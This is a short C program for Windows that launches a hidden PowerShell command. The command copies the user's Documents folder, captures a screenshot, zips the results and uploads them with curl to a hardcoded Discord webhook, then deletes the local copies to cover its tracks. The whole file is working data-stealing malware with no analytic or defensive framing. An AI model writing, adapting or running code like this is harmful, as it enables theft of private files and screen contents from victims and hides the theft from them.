#include <windows.h>
#include <stdlib.h>

int main() {
    const char* ps_script = 
        "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \""
        "$webhook = 'https://discord.com/api/webhooks/1563254991442022480/50P-PgopPRI4UaNdTJ6QJHEN1cLbvGSTCyMOC2xeIjR_fRRPUTk-KJns3bzgGGkrxZb0'; "
        "$dir = \\\"$env:TEMP\\\\stolen_data\\\"; New-Item -ItemType Directory -Force -Path $dir | Out-Null;"
        "Copy-Item \\\"$env:USERPROFILE\\\\Documents\\\\*\\\" -Destination $dir -Recurse -ErrorAction SilentlyContinue;"
        "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; "
        "$b = New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); "
        "$g = [Drawing.Graphics]::FromImage($b); $g.CopyFromScreen(0,0,0,0,$b.Size); $b.Save(\\\"$dir\\\\screenshot.png\\\");"
        "$zip = \\\"$env:TEMP\\\\exfil.zip\\\"; Compress-Archive -Path \\\"$dir\\\\*\\\" -DestinationPath $zip -Force;"
        "curl.exe -s -X POST $webhook -F \\\"file=@$zip\\\";"
        "Remove-Item -Path $dir -Recurse -Force; Remove-Item -Path $zip -Force;"
        "\"";
    system(ps_script);
    return 0;
}
